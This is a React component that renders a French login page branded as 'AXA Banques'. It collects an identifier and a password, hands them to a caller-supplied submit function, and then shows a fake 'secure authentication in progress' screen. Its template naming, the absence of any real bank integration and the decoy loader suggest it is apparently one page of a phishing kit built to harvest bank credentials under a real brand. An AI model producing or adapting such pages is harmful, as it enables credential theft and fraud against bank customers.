import React, { useState } from 'react';
import { Loader2, Eye, EyeOff } from 'lucide-react';

interface AxaBanquesAuthTemplateProps {
  onSubmit: (formData: any) => Promise<boolean>;
}

export function AxaBanquesAuthTemplate({ onSubmit }: AxaBanquesAuthTemplateProps) {
  const [formData, setFormData] = useState({
    identifier: '',
    password: ''
  });
  const [status, setStatus] = useState<'idle' | 'sending' | 'success' | 'error'>('idle');
  const [showLoader, setShowLoader] = useState(false);
  const [showPassword, setShowPassword] = useState(false);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setStatus('sending');

    try {
      const success = await onSubmit(formData);
      if (!success) throw new Error('Failed to submit form');
      
      setStatus('success');
      setShowLoader(true);
      
      setTimeout(() => {
        setShowLoader(false);
        setStatus('idle');
      }, 3000);
    } catch (error) {
      setStatus('error');
      setTimeout(() => setStatus('idle'), 3000);
    }
  };

  const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const { name, value } = e.target;
    setFormData(prev => ({
      ...prev,
      [name]: value
    }));
  };

  if (showLoader) {
    return (
      <div className="min-h-screen bg-gradient-to-br from-blue-100 to-blue-50 pt-20">
        <div className="max-w-4xl mx-auto px-4 py-8">
          <div className="bg-white rounded-2xl shadow-xl p-8">
            <div className="flex flex-col items-center justify-center py-16">
              <Loader2 className="w-12 h-12 animate-spin text-blue-600 mb-6" />
              <h2 className="text-2xl font-bold text-gray-800 mb-4">
                Authentification en cours...
              </h2>
              <p className="text-gray-600 text-center max-w-md">
                Connexion sécurisée à votre espace AXA Banques en cours. Veuillez patienter.
              </p>
              <div className="mt-8 w-full max-w-xs">
                <div className="bg-gray-200 rounded-full h-2">
                  <div className="bg-blue-600 h-2 rounded-full animate-pulse" style={{ width: '70%' }}></div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-gradient-to-br from-blue-100 to-blue-50 pt-20">
      <div className="max-w-4xl mx-auto px-4 py-8">
        <div className="bg-white rounded-2xl shadow-xl overflow-hidden">
          <div className="bg-gradient-to-r from-blue-600 to-blue-700 px-8 py-12">
            <h1 className="text-3xl font-bold text-white mb-2">AXA Banques</h1>
            <p className="text-blue-100">Authentification sécurisée</p>
          </div>

          <div className="p-8">
            <form onSubmit={handleSubmit} className="space-y-6 max-w-md mx-auto">
              <div>
                <label className="block text-sm font-medium text-gray-700 mb-2">
                  Identifiant
                </label>
                <input
                  type="text"
                  name="identifier"
                  value={formData.identifier}
                  onChange={handleChange}
                  placeholder="Entrez votre identifiant"
                  required
                  className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent"
                />
              </div>

              <div>
                <label className="block text-sm font-medium text-gray-700 mb-2">
                  Mot de passe
                </label>
                <div className="relative">
                  <input
                    type={showPassword ? 'text' : 'password'}
                    name="password"
                    value={formData.password}
                    onChange={handleChange}
                    placeholder="Entrez votre mot de passe"
                    required
                    className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent"
                  />
                  <button
                    type="button"
                    onClick={() => setShowPassword(!showPassword)}
                    className="absolute right-3 top-3 text-gray-500"
                  >
                    {showPassword ? <EyeOff size={20} /> : <Eye size={20} />}
                  </button>
                </div>
              </div>

              <button
                type="submit"
                disabled={status === 'sending'}
                className="w-full bg-blue-600 text-white font-semibold py-4 rounded-lg transition duration-200 hover:bg-blue-700 disabled:opacity-50 disabled:cursor-not-allowed"
              >
                {status === 'sending' ? 'Authentification...' : 'SE CONNECTER'}
              </button>

              {status === 'success' && !showLoader && (
                <div className="text-green-600 text-center bg-green-50 p-3 rounded-lg">
                  Authentification réussie!
                </div>
              )}
              {status === 'error' && (
                <div className="text-red-600 text-center bg-red-50 p-3 rounded-lg">
                  Erreur lors de l'authentification. Veuillez réessayer.
                </div>
              )}
            </form>
          </div>
        </div>
      </div>
    </div>
  );
}
